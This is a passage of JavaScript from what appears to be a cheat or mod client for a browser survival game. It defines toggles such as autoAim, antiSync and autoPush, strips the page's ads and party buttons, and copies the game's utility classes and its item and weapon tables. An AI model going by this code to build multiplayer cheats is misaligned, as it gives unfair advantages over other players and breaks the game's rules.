    this.groundY = y + (Math.random() * 60 - 30);
  }

  update(delta) {
    this.x += this.vx;
    this.y += this.vy;
    this.vy += this.gravity;
    this.life -= this.decay;
    this.size = this.maxSize * this.life;

    if (this.y >= this.groundY) {
      this.y = this.groundY;
      this.vy *= -this.bounce;
      this.vx *= 0.8;
    }

    return this.life > 0;
  }
}

function createBloodSplatter(x, y, damageAmount = 20, sid = null) {
  if (
    typeof x !== "number" ||
    typeof y !== "number" ||
    !isFinite(x) ||
    !isFinite(y) ||
    damageAmount <= 0
  ) {
    return;
  }

  const isLowDamage = damageAmount < 15;
  const particleCount = isLowDamage ? 8 : 15;
  const baseSize = isLowDamage ? 3 : 6;
  const baseSpeed = isLowDamage ? 2 : 3.5;

  for (let i = 0; i < particleCount; i++) {
    const angle = Math.random() * Math.PI * 2;
    const speed = baseSpeed + Math.random() * 2;
    const size = baseSize + Math.random() * 3;
    const color = `hsl(${Math.random() * 20}, 75%, ${30 + Math.random() * 25}%)`;

    bloodParticles.push(new BloodParticle(x, y, angle, speed, size, color));
  }
}

let my = {
  reloaded: false,
  waitHit: 0,
  autoAim: false,
  revAim: false,
  ageInsta: true,
  reSync: false,
  bullTick: 0,
  anti0Tick: 0,
  antiSync: false,
  safePrimary: function (tmpObj) {
    return [0, 8].includes(tmpObj.primaryIndex);
  },
  safeSecondary: function (tmpObj) {
    return [10, 11, 14].includes(tmpObj.secondaryIndex);
  },
  lastDir: 0,
  autoPush: false,
  pushData: {},
};
Mod.my = my;

function findID(tmpObj, tmp) {
  return tmpObj.find((THIS) => THIS.id == tmp);
}

function findSID(tmpObj, tmp) {
  return tmpObj.find((THIS) => THIS.sid == tmp);
}

function findPlayerByID(id) {
  return findID(players, id);
}

function findPlayerBySID(sid) {
  return findSID(players, sid);
}

function findAIBySID(sid) {
  return findSID(ais, sid);
}

function findObjectBySid(sid) {
  return findSID(gameObjects, sid);
}

function findProjectileBySid(sid) {
  return findSID(gameObjects, sid);
}

let adCard = getEl("adCard");
adCard?.remove();
let wideAdCard = getEl("wideAdCard");
wideAdCard?.remove();
let promoImgHolder = getEl("promoImgHolder");
promoImgHolder?.remove();
let linksContainer = getEl("linksContainer2");
linksContainer?.remove();
let joinPartyButton = getEl("joinPartyButton");
joinPartyButton?.remove();
let partyButton = getEl("partyButton");
partyButton?.remove();
let chatButton = getEl("chatButton");
chatButton?.remove();
let altServer = getEl("altServer");
altServer?.remove();

let gameCanvas = getEl("gameCanvas");
let mainContext = gameCanvas.getContext("2d");
let mapDisplay = getEl("mapDisplay");
let mapContext = mapDisplay.getContext("2d");
mapDisplay.width = 300;
mapDisplay.height = 300;
let storeMenu = getEl("storeMenu");
let storeHolder = getEl("storeHolder");
let upgradeHolder = getEl("upgradeHolder");
let upgradeCounter = getEl("upgradeCounter");
let chatBox = getEl("chatBox");
chatBox.autocomplete = "off";
chatBox.style.textAlign = "center";
chatBox.style.width = "18em";
let chatHolder = getEl("chatHolder");
let actionBar = getEl("actionBar");
let leaderboardData = getEl("leaderboardData");
let itemInfoHolder = getEl("itemInfoHolder");
let menuCardHolder = getEl("menuCardHolder");
let mainMenu = getEl("mainMenu");
let diedText = getEl("diedText");
let screenWidth;
let screenHeight;
let maxScreenWidth = config.maxScreenWidth;
let maxScreenHeight = config.maxScreenHeight;
let pixelDensity = 1;
let delta;
let now;
let lastUpdate = performance.now();
let camX;
let camY;
let tmpDir;
let mouseX = 0;
let mouseY = 0;
let allianceMenu = getEl("allianceMenu");
let waterMult = 1;
let waterPlus = 0;
let outlineColor = "#525252";
let darkOutlineColor = "#3d3f42";
let outlineWidth = 5.5;

let firstSetup = true;
let keys = {};
let moveKeys = {
  87: [0, -1],
  38: [0, -1],
  83: [0, 1],
  40: [0, 1],
  65: [-1, 0],
  37: [-1, 0],
  68: [1, 0],
  39: [1, 0],
};

let attackState = Mod.attackState;
let inGame = Mod.inGame;

let macro = Mod.macro;
let mills = Mod.mills;
let lastDir;

let lastLeaderboardData = Mod.lastLeaderboardData;

let inWindow = true;
window.onblur = function () {
  inWindow = false;
};
window.onfocus = function () {
  inWindow = true;
};
let ms = {
  avg: 0,
  max: 0,
  min: 0,
  delay: 0,
};
function pingSocketResponse() {
  let pingTime = window.pingTime;
  const pingDisplay = document.getElementById("pingDisplay");
  pingDisplay.innerText = "";
  if (pingTime > ms.max || isNaN(ms.max)) {
    ms.max = pingTime;
  }
  if (pingTime < ms.min || isNaN(ms.min)) {
    ms.min = pingTime;
  }
}

let placeVisible = [];

class Utils {
  constructor() {
    let mathABS = Math.abs,
      mathCOS = Math.cos,
      mathSIN = Math.sin,
      mathPOW = Math.pow,
      mathSQRT = Math.sqrt,
      mathATAN2 = Math.atan2,
      mathPI = Math.PI;

    let self = this;

    this.round = function (n, v) {
      return Math.round(n * v) / v;
    };
    this.toRad = function (angle) {
      return angle * (mathPI / 180);
    };
    this.toAng = function (radian) {
      return radian / (mathPI / 180);
    };
    this.randInt = function (min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    };
    this.randFloat = function (min, max) {
      return Math.random() * (max - min + 1) + min;
    };
    this.lerp = function (value1, value2, amount) {
      return value1 + (value2 - value1) * amount;
    };
    this.decel = function (val, cel) {
      if (val > 0) val = Math.max(0, val - cel);
      else if (val < 0) val = Math.min(0, val + cel);
      return val;
    };
    this.getDistance = function (x1, y1, x2, y2) {
      return mathSQRT((x2 -= x1) * x2 + (y2 -= y1) * y2);
    };
    this.getDist = function (tmp1, tmp2, type1, type2) {
      let tmpXY1 = {
        x:
          type1 == 0
            ? tmp1.x
            : type1 == 1
              ? tmp1.x1
              : type1 == 2
                ? tmp1.x2
                : type1 == 3 && tmp1.x3,
        y:
          type1 == 0
            ? tmp1.y
            : type1 == 1
              ? tmp1.y1
              : type1 == 2
                ? tmp1.y2
                : type1 == 3 && tmp1.y3,
      };
      let tmpXY2 = {
        x:
          type2 == 0
            ? tmp2.x
            : type2 == 1
              ? tmp2.x1
              : type2 == 2
                ? tmp2.x2
                : type2 == 3 && tmp2.x3,
        y:
          type2 == 0
            ? tmp2.y
            : type2 == 1
              ? tmp2.y1
              : type2 == 2
                ? tmp2.y2
                : type2 == 3 && tmp2.y3,
      };
      return mathSQRT(
        (tmpXY2.x -= tmpXY1.x) * tmpXY2.x + (tmpXY2.y -= tmpXY1.y) * tmpXY2.y,
      );
    };
    this.getDirection = function (x1, y1, x2, y2) {
      return mathATAN2(y1 - y2, x1 - x2);
    };
    this.getDirect = function (tmp1, tmp2, type1, type2) {
      let tmpXY1 = {
        x:
          type1 == 0
            ? tmp1.x
            : type1 == 1
              ? tmp1.x1
              : type1 == 2
                ? tmp1.x2
                : type1 == 3 && tmp1.x3,
        y:
          type1 == 0
            ? tmp1.y
            : type1 == 1
              ? tmp1.y1
              : type1 == 2
                ? tmp1.y2
                : type1 == 3 && tmp1.y3,
      };
      let tmpXY2 = {
        x:
          type2 == 0
            ? tmp2.x
            : type2 == 1
              ? tmp2.x1
              : type2 == 2
                ? tmp2.x2
                : type2 == 3 && tmp2.x3,
        y:
          type2 == 0
            ? tmp2.y
            : type2 == 1
              ? tmp2.y1
              : type2 == 2
                ? tmp2.y2
                : type2 == 3 && tmp2.y3,
      };
      return mathATAN2(tmpXY1.y - tmpXY2.y, tmpXY1.x - tmpXY2.x);
    };
    this.getAngleDist = function (a, b) {
      let p = mathABS(b - a) % (mathPI * 2);
      return p > mathPI ? mathPI * 2 - p : p;
    };
    this.isNumber = function (n) {
      return typeof n == "number" && !isNaN(n) && isFinite(n);
    };
    this.isString = function (s) {
      return s && typeof s == "string";
    };
    this.kFormat = function (num) {
      return num > 999 ? (num / 1000).toFixed(1) + "k" : num;
    };
    this.sFormat = function (num) {
      let fixs = [
        {
          num: 1e3,
          string: "k",
        },
        {
          num: 1e6,
          string: "m",
        },
        {
          num: 1e9,
          string: "b",
        },
        {
          num: 1e12,
          string: "q",
        },
      ].reverse();
      let sp = fixs.find((v) => num >= v.num);
      if (!sp) return num;
      return (num / sp.num).toFixed(1) + sp.string;
    };
    this.capitalizeFirst = function (string) {
      return string.charAt(0).toUpperCase() + string.slice(1);
    };
    this.fixTo = function (n, v) {
      return parseFloat(n.toFixed(v));
    };
    this.sortByPoints = function (a, b) {
      return parseFloat(b.points) - parseFloat(a.points);
    };
    this.lineInRect = function (recX, recY, recX2, recY2, x1, y1, x2, y2) {
      let minX = x1;
      let maxX = x2;
      if (x1 > x2) {
        minX = x2;
        maxX = x1;
      }
      if (maxX > recX2) maxX = recX2;
      if (minX < recX) minX = recX;
      if (minX > maxX) return false;
      let minY = y1;
      let maxY = y2;
      let dx = x2 - x1;
      if (Math.abs(dx) > 0.0000001) {
        let a = (y2 - y1) / dx;
        let b = y1 - a * x1;
        minY = a * minX + b;
        maxY = a * maxX + b;
      }
      if (minY > maxY) {
        let tmp = maxY;
        maxY = minY;
        minY = tmp;
      }
      if (maxY > recY2) maxY = recY2;
      if (minY < recY) minY = recY;
      if (minY > maxY) return false;
      return true;
    };
    this.containsPoint = function (element, x, y) {
      let bounds = element.getBoundingClientRect();
      let left = bounds.left + window.scrollX;
      let top = bounds.top + window.scrollY;
      let width = bounds.width;
      let height = bounds.height;

      let insideHorizontal = x > left && x < left + width;
      let insideVertical = y > top && y < top + height;
      return insideHorizontal && insideVertical;
    };
    this.mousifyTouchEvent = function (event) {
      let touch = event.changedTouches[0];
      event.screenX = touch.screenX;
      event.screenY = touch.screenY;
      event.clientX = touch.clientX;
      event.clientY = touch.clientY;
      event.pageX = touch.pageX;
      event.pageY = touch.pageY;
    };
    this.hookTouchEvents = function (element, skipPrevent) {
      let preventDefault = !skipPrevent;
      let isHovering = false;
      let passive = false;
      element.addEventListener(
        "touchstart",
        this.checkTrusted(touchStart),
        passive,
      );
      element.addEventListener(
        "touchmove",
        this.checkTrusted(touchMove),
        passive,
      );
      element.addEventListener(
        "touchend",
        this.checkTrusted(touchEnd),
        passive,
      );
      element.addEventListener(
        "touchcancel",
        this.checkTrusted(touchEnd),
        passive,
      );
      element.addEventListener(
        "touchleave",
        this.checkTrusted(touchEnd),
        passive,
      );

      function touchStart(e) {
        self.mousifyTouchEvent(e);
        window.setUsingTouch(true);
        if (preventDefault) {
          e.preventDefault();
          e.stopPropagation();
        }
        if (element.onmouseover) {
          element.onmouseover(e);
          isHovering = true;
        }
      }

      function touchMove(e) {
        self.mousifyTouchEvent(e);
        window.setUsingTouch(true);
        if (preventDefault) {
          e.preventDefault();
          e.stopPropagation();
        }
        if (self.containsPoint(element, e.pageX, e.pageY)) {
          if (!isHovering) {
            if (element.onmouseover) {
              element.onmouseover(e);
              isHovering = true;
            }
          }
        } else {
          if (isHovering) {
            if (element.onmouseout) {
              element.onmouseout(e);
              isHovering = false;
            }
          }
        }
      }

      function touchEnd(e) {
        self.mousifyTouchEvent(e);
        window.setUsingTouch(true);
        if (preventDefault) {
          e.preventDefault();
          e.stopPropagation();
        }
        if (isHovering) {
          if (element.onclick) element.onclick(e);
          if (element.onmouseout) element.onmouseout(e);
          isHovering = false;
        }
      }
    };
    this.removeAllChildren = function (element) {
      while (element.hasChildNodes()) {
        element.removeChild(element.lastChild);
      }
    };
    this.generateElement = function (config) {
      let element = document.createElement(config.tag || "div");

      function bind(configValue, elementValue) {
        if (config[configValue]) element[elementValue] = config[configValue];
      }
      bind("text", "textContent");
      bind("html", "innerHTML");
      bind("class", "className");
      for (let key in config) {
        switch (key) {
          case "tag":
          case "text":
          case "html":
          case "class":
          case "style":
          case "hookTouch":
          case "parent":
          case "children":
            continue;
          default:
            break;
        }
        element[key] = config[key];
      }
      if (element.onclick) element.onclick = this.checkTrusted(element.onclick);
      if (element.onmouseover)
        element.onmouseover = this.checkTrusted(element.onmouseover);
      if (element.onmouseout)
        element.onmouseout = this.checkTrusted(element.onmouseout);
      if (config.style) {
        element.style.cssText = config.style;
      }
      if (config.hookTouch) {
        this.hookTouchEvents(element);
      }
      if (config.parent) {
        config.parent.appendChild(element);
      }
      if (config.children) {
        for (let i = 0; i < config.children.length; i++) {
          element.appendChild(config.children[i]);
        }
      }
      return element;
    };
    this.checkTrusted = function (callback) {
      return function (ev) {
        if (
          ev &&
          ev instanceof Event &&
          (ev && typeof ev.isTrusted == "boolean" ? ev.isTrusted : true)
        ) {
          callback(ev);
        }
      };
    };
    this.randomString = function (length) {
      let text = "";
      let possible =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (let i = 0; i < length; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
      }
      return text;
    };
    this.countInArray = function (array, val) {
      let count = 0;
      for (let i = 0; i < array.length; i++) {
        if (array[i] === val) count++;
      }
      return count;
    };
    this.hexToRgb = function (hex) {
      return hex
        .slice(1)
        .match(/.{1,2}/g)
        .map((g) => parseInt(g, 16));
    };
    this.getRgb = function (r, g, b) {
      return [r / 255, g / 255, b / 255].join(", ");
    };
  }
}

class Animtext {
  constructor() {
    this.init = function (x, y, scale, speed, life, text, color, uid) {
      this.x = x;
      this.y = y;
      this.baseY = y;
      this.color = color;
      this.scale = scale;
      this.text = text;
      this.uid = uid;

      this.life = life || 1500;
      this.maxLife = this.life;
      this.value = this.tryParseNumber(text);

      this.alpha = 0;
      this.createdTime = Date.now();
    };

    this.tryParseNumber = function (text) {
      if (typeof text !== "string") return null;
      const num = parseInt(text, 10);
      return isNaN(num) ? null : num;
    };

    this.addValue = function (value, newLife = 1500) {
      if (typeof value !== "number") return;
      if (this.value === null) this.value = 0;

      this.value += value;
      this.text = String(this.value);
      this.life = newLife;
      this.maxLife = newLife;
      this.createdTime = Date.now();
    };

    this.update = function (delta) {
      if (this.life <= 0) return;

      this.life -= delta;

      if (this.life > this.maxLife - 300) {
        this.alpha = Math.min(1, (this.maxLife - this.life) / 300);
      } else if (this.life < 500) {
        this.alpha = Math.max(0, this.life / 500);
      } else {
        this.alpha = 1;
      }
    };

    this.render = function (ctxt, xOff, yOff) {
      if (this.life <= 0 || this.alpha <= 0) return;

      ctxt.save();
      ctxt.globalAlpha = this.alpha;

      ctxt.font = `${this.scale}px "Segoe UI", Arial, sans-serif`;
      ctxt.textAlign = "center";
      ctxt.textBaseline = "middle";
      ctxt.lineWidth = 4;
      ctxt.shadowColor = "rgba(0,0,0,0.5)";
      ctxt.shadowBlur = 4;
      ctxt.shadowOffsetX = 0;
      ctxt.shadowOffsetY = 2;

      ctxt.fillStyle = this.color;
      ctxt.strokeStyle = "black";
      ctxt.strokeText(this.text, this.x - xOff, this.baseY - yOff);
      ctxt.fillText(this.text, this.x - xOff, this.baseY - yOff);

      ctxt.shadowBlur = 0;
      ctxt.globalAlpha = 1;
      ctxt.restore();
    };
  }
}

class Textmanager {
  constructor() {
    this.texts = [];

    this.update = function (delta, ctxt, xOff, yOff) {
      for (let i = 0; i < this.texts.length; ++i) {
        if (this.texts[i].life > 0) {
          this.texts[i].update(delta);
          this.texts[i].render(ctxt, xOff, yOff);
        }
      }
    };

    this.showText = function (x, y, scale, speed, life, text, color) {
      const textStr = String(text);
      const value = this.tryParseNumber(textStr);

      if (value === null) {
        this.createNewText(x, y, scale, speed, life, textStr, color);
        return;
      }

      for (let i = 0; i < this.texts.length; ++i) {
        const txt = this.texts[i];
        if (
          txt.life > 0 &&
          Math.abs(txt.x - x) < 30 &&
          Math.abs(txt.y - y) < 30 &&
          txt.color === color &&
          txt.value !== null
        ) {
          txt.addValue(value, life || 1500);
          return;
        }
      }

      this.createNewText(x, y, scale, speed, life, textStr, color, value);
    };

    this.tryParseNumber = function (text) {
      if (typeof text !== "string") return null;
      if (/^-?\d+$/.test(text.trim())) {
        const num = parseInt(text, 10);
        return isNaN(num) ? null : num;
      }
      return null;
    };

    this.createNewText = function (
      x,
      y,
      scale,
      speed,
      life,
      text,
      color,
      value = null,
    ) {
      let tmpText = null;
      for (let i = 0; i < this.texts.length; ++i) {
        if (this.texts[i].life <= 0) {
          tmpText = this.texts[i];
          break;
        }
      }

      if (!tmpText) {
        tmpText = new Animtext();
        this.texts.push(tmpText);
      }

      const uid = Date.now() + Math.random();
      tmpText.init(x, y, scale, speed, life, text, color, uid);
      if (value !== null) tmpText.value = value;
    };
  }
}

class GameObject {
  constructor(sid) {
    this.sid = sid;

    this.init = function (x, y, dir, scale, type, data, owner) {
      data = data || {};
      this.sentTo = {};
      this.gridLocations = [];
      this.active = true;
      this.render = true;
      this.doUpdate = data.doUpdate;
      this.x = x;
      this.y = y;
      this.dir = dir;
      this.lastDir = dir;
      this.xWiggle = 0;
      this.yWiggle = 0;
      this.visScale = scale;
      this.scale = scale;
      this.type = type;
      this.id = data.id;
      this.owner = owner;
      this.name = data.name;
      this.isItem = this.id != undefined;
      this.group = data.group;
      this.maxHealth = data.health;
      this.health = this.maxHealth;
      this.layer = 2;
      if (this.group != undefined) {
        this.layer = this.group.layer;
      } else if (this.type == 0) {
        this.layer = 3;
      } else if (this.type == 2) {
        this.layer = 0;
      } else if (this.type == 4) {
        this.layer = -1;
      }
      this.colDiv = data.colDiv || 1;
      this.blocker = data.blocker;
      this.ignoreCollision = data.ignoreCollision;
      this.dontGather = data.dontGather;
      this.hideFromEnemy = data.hideFromEnemy;
      this.friction = data.friction;
      this.projDmg = data.projDmg;
      this.dmg = data.dmg;
      this.pDmg = data.pDmg;
      this.pps = data.pps;
      this.zIndex = data.zIndex || 0;
      this.turnSpeed = data.turnSpeed;
      this.req = data.req;
      this.trap = data.trap;
      this.healCol = data.healCol;
      this.teleport = data.teleport;
      this.boostSpeed = data.boostSpeed;
      this.projectile = data.projectile;
      this.shootRange = data.shootRange;
      this.shootRate = data.shootRate;
      this.shootCount = this.shootRate;
      this.spawnPoint = data.spawnPoint;
      this.onNear = 0;
      this.breakObj = false;
      this.alpha = data.alpha || 1;
      this.maxAlpha = data.alpha || 1;
      this.damaged = 0;
    };

    this.changeHealth = function (amount, doer) {
      this.health += amount;
      return this.health <= 0;
    };

    this.getScale = function (sM, ig) {
      sM = sM || 1;
      return (
        this.scale *
        (this.isItem || this.type == 2 || this.type == 3 || this.type == 4
          ? 1
          : 0.6 * sM) *
        (ig ? 1 : this.colDiv)
      );
    };

    this.visibleToPlayer = function (player) {
      return (
        !this.hideFromEnemy ||
        (this.owner &&
          (this.owner == player ||
            (this.owner.team && player.team == this.owner.team)))
      );
    };

    this.update = function (delta) {
      if (this.active) {
        if (this.xWiggle) {
          this.xWiggle *= Math.pow(0.99, delta);
        }
        if (this.yWiggle) {
          this.yWiggle *= Math.pow(0.99, delta);
        }
        let d2 = UTILS.getAngleDist(this.lastDir, this.dir);
        if (d2 > 0.01) {
          this.dir += d2 / 5;
        } else {
          this.dir = this.lastDir;
        }
      } else {
        if (this.alive) {
          this.alpha -= delta / (200 / this.maxAlpha);
          this.visScale += delta / (this.scale / 2.5);
          if (this.alpha <= 0) {
            this.alpha = 0;
            this.alive = false;
          }
        }
      }
    };

    this.isTeamObject = function (tmpObj) {
      return this.owner == null
        ? true
        : (this.owner && tmpObj.sid == this.owner.sid) ||
        tmpObj.findAllianceBySid(this.owner.sid);
    };
  }
}
class Items {
  constructor() {
    this.groups = [
      {
        id: 0,
        name: "food",
        layer: 0,
      },
      {
        id: 1,
        name: "walls",
        place: true,
        limit: 30,
        layer: 0,
      },
      {
        id: 2,
        name: "spikes",
        place: true,
        limit: 15,
        layer: 0,
      },
      {
        id: 3,
        name: "mill",
        sandboxLimit: 299,
        place: true,
        limit: 7,
        layer: 1,
      },
      {
        id: 4,
        name: "mine",
        place: true,
        limit: 1,
        layer: 0,
      },
      {
        id: 5,
        name: "trap",
        place: true,
        limit: 6,
        layer: -1,
      },
      {
        id: 6,
        name: "booster",
        sandboxLimit: 299,
        place: true,
        limit: 12,
        layer: -1,
      },
      {
        id: 7,
        name: "turret",
        place: true,
        limit: 2,
        layer: 1,
      },
      {
        id: 8,
        name: "watchtower",
        place: true,
        limit: 12,
        layer: 1,
      },
      {
        id: 9,
        name: "buff",
        place: true,
        limit: 4,
        layer: -1,
      },
      {
        id: 10,
        name: "spawn",
        place: true,
        limit: 1,
        layer: -1,
      },
      {
        id: 11,
        name: "sapling",
        place: true,
        limit: 2,
        layer: 0,
      },
      {
        id: 12,
        name: "blocker",
        place: true,
        limit: 3,
        layer: -1,
      },
      {
        id: 13,
        name: "teleporter",
        sandboxLimit: 299,
        place: true,
        limit: 2,
        layer: -1,
      },
    ];

    this.projectiles = [
      {
        indx: 0,
        layer: 0,
        src: "arrow_1",
        dmg: 25,
        speed: 1.6,
        scale: 103,
        range: 1000,
      },
      {
        indx: 1,
        layer: 1,
        dmg: 25,
        scale: 20,
      },
      {
        indx: 0,
        layer: 0,
        src: "arrow_1",
        dmg: 35,
        speed: 2.5,
        scale: 103,
        range: 1200,
      },
      {
        indx: 0,
        layer: 0,
        src: "arrow_1",
        dmg: 30,
        speed: 2,
        scale: 103,
        range: 1200,
      },
      {
        indx: 1,
        layer: 1,
        dmg: 16,
        scale: 20,
      },
      {
        indx: 0,
        layer: 0,
        src: "bullet_1",
        dmg: 50,
        speed: 3.6,
        scale: 160,
        range: 1400,
      },
    ];

    this.weapons = [
      {
        id: 0,
        type: 0,
        name: "tool hammer",
        desc: "tool for gathering all resources",
        src: "hammer_1",
        length: 140,
        width: 140,
        xOff: -3,
        yOff: 18,
        dmg: 25,
        range: 65,
        gather: 1,
        speed: 300,
      },
      {
        id: 1,
        type: 0,
        age: 2,
        name: "hand axe",
        desc: "gathers resources at a higher rate",
        src: "axe_1",
        length: 140,
        width: 140,
        xOff: 3,
        yOff: 24,
        dmg: 30,
        spdMult: 1,
        range: 70,
        gather: 2,
        speed: 400,
      },
      {
        id: 2,
        type: 0,
        age: 8,
        pre: 1,
        name: "great axe",
        desc: "deal more damage and gather more resources",
        src: "great_axe_1",
        length: 140,
        width: 140,
        xOff: -8,
        yOff: 25,
        dmg: 35,
        spdMult: 1,
        range: 75,
        gather: 4,
        speed: 400,
      },
      {
        id: 3,
        type: 0,
        age: 2,
        name: "short sword",
        desc: "increased attack power but slower move speed",
        src: "sword_1",
        iPad: 1.3,
        length: 130,
        width: 210,
        xOff: -8,
        yOff: 46,
        dmg: 35,
        spdMult: 0.85,
        range: 110,
        gather: 1,
        speed: 300,
      },
      {
        id: 4,
        type: 0,
        age: 8,
        pre: 3,
        name: "katana",
        desc: "greater range and damage",
        src: "samurai_1",
        iPad: 1.3,
        length: 130,
        width: 210,
        xOff: -8,
        yOff: 59,
        dmg: 40,
        spdMult: 0.8,
        range: 118,
        gather: 1,
        speed: 300,
      },
      {
        id: 5,
        type: 0,
        age: 2,
        name: "polearm",
        desc: "long range melee weapon",
        src: "spear_1",
        iPad: 1.3,
        length: 130,
        width: 210,
        xOff: -8,
        yOff: 53,
        dmg: 45,
        knock: 0.2,
        spdMult: 0.82,
        range: 142,
        gather: 1,
        speed: 700,
      },
      {
        id: 6,
        type: 0,
        age: 2,
        name: "bat",
        desc: "fast long range melee weapon",
        src: "bat_1",
        iPad: 1.3,
        length: 110,
        width: 180,
        xOff: -8,
        yOff: 53,
        dmg: 20,
        knock: 0.7,
        range: 110,
        gather: 1,
        speed: 300,
      },
      {
        id: 7,
        type: 0,
        age: 2,
        name: "daggers",
        desc: "really fast short range weapon",
        src: "dagger_1",
        iPad: 0.8,
        length: 110,
        width: 110,
        xOff: 18,
        yOff: 0,
        dmg: 20,
        knock: 0.1,
        range: 65,
        gather: 1,
        hitSlow: 0.1,
        spdMult: 1.13,
        speed: 100,
      },
      {
        id: 8,
        type: 0,
        age: 2,
        name: "stick",
        desc: "great for gathering but very weak",
        src: "stick_1",
        length: 140,
        width: 140,
        xOff: 3,
        yOff: 24,
        dmg: 1,
        spdMult: 1,
        range: 70,
        gather: 7,
        speed: 400,
      },
      {
        id: 9,
        type: 1,
        age: 6,
        name: "hunting bow",
        desc: "bow used for ranged combat and hunting",
        src: "bow_1",
        req: ["wood", 4],
        length: 120,
        width: 120,
        xOff: -6,
        yOff: 0,
        Pdmg: 25,
        projectile: 0,
        spdMult: 0.75,
        speed: 600,
      },
      {
        id: 10,
        type: 1,
        age: 6,
        name: "great hammer",
        desc: "hammer used for destroying structures",
        src: "great_hammer_1",
        length: 140,
        width: 140,
        xOff: -9,
        yOff: 25,
        dmg: 10,
        Pdmg: 10,
        spdMult: 0.88,
        range: 75,
        sDmg: 7.5,
        gather: 1,
        speed: 400,
      },
      {
        id: 11,
        type: 1,
        age: 6,
        name: "wooden shield",
        desc: "blocks projectiles and reduces melee damage",
        src: "shield_1",
        length: 120,
        width: 120,
        shield: 0.2,
        xOff: 6,
        yOff: 0,
        Pdmg: 0,
        spdMult: 0.7,
      },
      {
        id: 12,
        type: 1,
        age: 8,
        pre: 9,
        name: "crossbow",
        desc: "deals more damage and has greater range",
        src: "crossbow_1",
        req: ["wood", 5],
        aboveHand: true,
        armS: 0.75,
        length: 120,
        width: 120,
        xOff: -4,
        yOff: 0,
        Pdmg: 35,
        projectile: 2,
        spdMult: 0.7,
        speed: 700,
      },
      {
        id: 13,
        type: 1,
        age: 9,
        pre: 12,
        name: "repeater crossbow",
        desc: "high firerate crossbow with reduced damage",
        src: "crossbow_2",
        req: ["wood", 10],
        aboveHand: true,
        armS: 0.75,
        length: 120,
        width: 120,
        xOff: -4,
        yOff: 0,
        Pdmg: 30,
        projectile: 3,
        spdMult: 0.7,
        speed: 230,
      },
      {
        id: 14,
        type: 1,
        age: 6,
        name: "mc grabby",
        desc: "steals resources from enemies",
        src: "grab_1",
        length: 130,
        width: 210,
        xOff: -8,
        yOff: 53,
        dmg: 0,
        Pdmg: 0,
        steal: 250,
        knock: 0.2,
        spdMult: 1.05,
        range: 125,
        gather: 0,
        speed: 700,
      },
      {
        id: 15,
        type: 1,
        age: 9,
        pre: 12,
        name: "musket",
        desc: "slow firerate but high damage and range",
        src: "musket_1",
        req: ["stone", 10],
        aboveHand: true,
        rec: 0.35,
        armS: 0.6,
        hndS: 0.3,
        hndD: 1.6,
        length: 205,
        width: 205,
        xOff: 25,
        yOff: 0,
        Pdmg: 50,
        projectile: 5,
        hideProjectile: true,
        spdMult: 0.6,
        speed: 1500,
      },
    ];

    this.list = [
      {
        group: this.groups[0],
        name: "apple",
        desc: "restores 20 health when consumed",
        req: ["food", 10],
        consume: function (doer) {
          return doer.changeHealth(20, doer);
        },
        scale: 22,
        holdOffset: 15,
        healing: 20,
        itemID: 0,
        itemAID: 16,
      },
      {
        age: 3,
        group: this.groups[0],
        name: "cookie",
        desc: "restores 40 health when consumed",
        req: ["food", 15],
        consume: function (doer) {
          return doer.changeHealth(40, doer);
        },
        scale: 27,
        holdOffset: 15,
        healing: 40,
        itemID: 1,
        itemAID: 17,
      },
      {
        age: 7,
        group: this.groups[0],
        name: "cheese",
        desc: "restores 30 health and another 50 over 5 seconds",
        req: ["food", 25],
        consume: function (doer) {
          if (doer.changeHealth(30, doer) || doer.health < 100) {
            doer.dmgOverTime.dmg = -10;
            doer.dmgOverTime.doer = doer;
            doer.dmgOverTime.time = 5;
            return true;
          }
          return false;
        },
        scale: 27,
        holdOffset: 15,
        healing: 30,
        itemID: 2,
        itemAID: 18,
      },
      {
        group: this.groups[1],
        name: "wood wall",
        desc: "provides protection for your village",
        req: ["wood", 10],
        projDmg: true,
        health: 380,
        scale: 50,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 3,
        itemAID: 19,
      },
      {
        age: 3,
        group: this.groups[1],
        name: "stone wall",
        desc: "provides improved protection for your village",
        req: ["stone", 25],
        health: 900,
        scale: 50,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 4,
        itemAID: 20,
      },
      {
        age: 7,
        group: this.groups[1],
        name: "castle wall",
        desc: "provides powerful protection for your village",
        req: ["stone", 35],
        health: 1500,
        scale: 52,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 5,
        itemAID: 21,
      },
      {
        group: this.groups[2],
        name: "spikes",
        desc: "damages enemies when they touch them",
        req: ["wood", 20, "stone", 5],
        health: 400,
        dmg: 20,
        scale: 49,
        spritePadding: -23,
        holdOffset: 8,
        placeOffset: -5,
        itemID: 6,
        itemAID: 22,
        shadow: {
          offsetX: 5,
          offsetY: 5,
          color: "rgba(0, 0, 0, 0.5)",
        },
      },
      {
        age: 5,
        group: this.groups[2],
        name: "greater spikes",
        desc: "damages enemies when they touch them",
        req: ["wood", 30, "stone", 10],
        health: 500,
        dmg: 35,
        scale: 52,
        spritePadding: -23,
        holdOffset: 8,
        placeOffset: -5,
        itemID: 7,
        itemAID: 23,
      },
      {
        age: 9,
        group: this.groups[2],
        name: "poison spikes",
        desc: "poisons enemies when they touch them",
        req: ["wood", 35, "stone", 15],
        health: 600,
        dmg: 30,
        pDmg: 5,
        scale: 52,
        spritePadding: -23,
        holdOffset: 8,
        placeOffset: -5,
        itemID: 8,
        itemAID: 24,
      },
      {
        age: 9,
        group: this.groups[2],
        name: "spinning spikes",
        desc: "damages enemies when they touch them",
        req: ["wood", 30, "stone", 20],
        health: 500,
        dmg: 45,
        turnSpeed: 0.003,
        scale: 52,
        spritePadding: -23,
        holdOffset: 8,
        placeOffset: -5,
        itemID: 9,
        itemAID: 25,
      },
      {
        group: this.groups[3],
        name: "windmill",
        desc: "generates gold over time",
        req: ["wood", 50, "stone", 10],
        health: 400,
        pps: 1,
        turnSpeed: 0.0016,
        spritePadding: 25,
        iconLineMult: 12,
        scale: 45,
        holdOffset: 20,
        placeOffset: 5,
        itemID: 10,
        itemAID: 26,
      },
      {
        age: 5,
        group: this.groups[3],
        name: "faster windmill",
        desc: "generates more gold over time",
        req: ["wood", 60, "stone", 20],
        health: 500,
        pps: 1.5,
        turnSpeed: 0.0025,
        spritePadding: 25,
        iconLineMult: 12,
